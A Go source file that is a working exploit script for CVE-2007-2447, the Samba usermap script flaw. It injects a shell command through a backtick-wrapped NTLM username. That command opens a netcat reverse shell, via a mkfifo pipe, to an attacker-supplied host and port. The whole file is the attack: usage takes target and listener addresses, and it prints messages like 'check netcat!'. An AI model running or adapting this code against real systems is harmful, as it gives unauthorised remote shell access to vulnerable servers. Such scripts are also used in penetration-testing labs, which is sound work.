package main

import (
	"fmt"
	"net"
	"os"
	"time"

	"github.com/hirochachacha/go-smb2"
)

func exploit(rhost, rport, lhost, lport string) {
	payload := fmt.Sprintf("mkfifo /tmp/hago; nc %s %s 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago", lhost, lport)
	username := fmt.Sprintf("/=`nohup %s`", payload)

	dialer := net.Dialer{Timeout: time.Second}
	conn, err := dialer.Dial("tcp", net.JoinHostPort(rhost, rport))
	if err != nil {
		fmt.Println("[-] Connection failed:", err)
		return
	}
	defer conn.Close()

	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     username,
			Password: "",
			Domain:   "",
		},
	}

	_, err = d.Dial(conn)
	if err != nil {
		fmt.Println("[+] Payload was sent - check netcat!")
	} else {
		fmt.Println("[-] Failed to send payload.")
	}
}

func main() {
	fmt.Println("[*] CVE-2007-2447 - Samba usermap script")
	if len(os.Args) != 5 {
		fmt.Printf("[-] Usage: %s <RHOST> <RPORT> <LHOST> <LPORT>\n", os.Args[0])
		return
	}

	rhost := os.Args[1]
	rport := os.Args[2]
	lhost := os.Args[3]
	lport := os.Args[4]

	fmt.Println("[+] Connecting!")
	exploit(rhost, rport, lhost, lport)
}
